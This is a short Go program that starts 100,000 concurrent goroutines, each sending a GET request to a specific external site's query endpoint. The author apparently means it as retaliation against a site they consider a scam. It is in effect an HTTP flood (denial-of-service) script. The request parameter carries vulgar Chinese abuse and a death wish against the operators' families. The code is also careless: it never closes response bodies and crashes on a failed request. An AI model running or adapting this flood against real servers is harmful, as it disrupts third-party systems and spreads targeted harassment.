package main

import (
	"log"
	"net/http"
	"strconv"
)

func main () {
	i := 1
	for i <= 100000 {
		go pinduoduo(i)
		i += 1
	}

	ch := make(chan struct{})

	select {
	case <-ch:

	}
}

func pinduoduo (i int) {

	// https://1oa.i-vin.cn/xb_ajax.php?act=query&data=%E5%85%8D%E8%B4%B9&status=&page=1
	url := "https://1oa.i-vin.cn/xb_ajax.php?act=query&data=CAONIMA骗子死全家WENHOUNIQUANJIANVXING&status=&page="
	url = url + strconv.Itoa(i)
	resp, err := http.Get(url)
	if err != nil {
		log.Println(err)
	}
	log.Println(resp.StatusCode)
}